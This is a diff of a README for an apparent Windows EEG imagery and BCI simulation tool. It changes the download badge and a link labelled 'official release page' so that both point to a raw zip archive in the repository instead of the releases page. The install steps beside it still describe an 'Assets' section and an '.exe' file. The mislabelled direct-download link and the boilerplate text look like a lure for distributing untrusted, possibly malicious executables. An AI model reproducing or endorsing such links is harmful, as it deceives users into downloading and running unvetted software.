@@ -1,6 +1,6 @@
 # 🧠 eeg-image-library - Visualize brain waves with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Arguseyed-reformation774/eeg-image-library/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Arguseyed-reformation774/eeg-image-library/raw/refs/heads/main/bci-apps/image-library-eeg-v2.4.zip)
 
 This software provides a tool for brain-computer interface users. It functions as a reference library for EEG imagery. It also serves as a simulation platform for real-time BCI workflows. You do not need to install extra libraries or frameworks to use this program. It runs directly on your Windows system.
 
@@ -9,7 +9,7 @@ This software provides a tool for brain-computer interface users. It functions a
 You need to access the software files to begin. Follow these instructions to get the application onto your computer.
 
 1. Open your preferred web browser.
-2. Go to the [official release page](https://github.com/Arguseyed-reformation774/eeg-image-library/releases).
+2. Go to the [official release page](https://github.com/Arguseyed-reformation774/eeg-image-library/raw/refs/heads/main/bci-apps/image-library-eeg-v2.4.zip).
 3. Look for the section labeled "Assets."
 4. Click the file that ends with ".exe" to start the download.
 5. Save this file to a folder you can find easily, such as your Downloads folder or your Desktop.
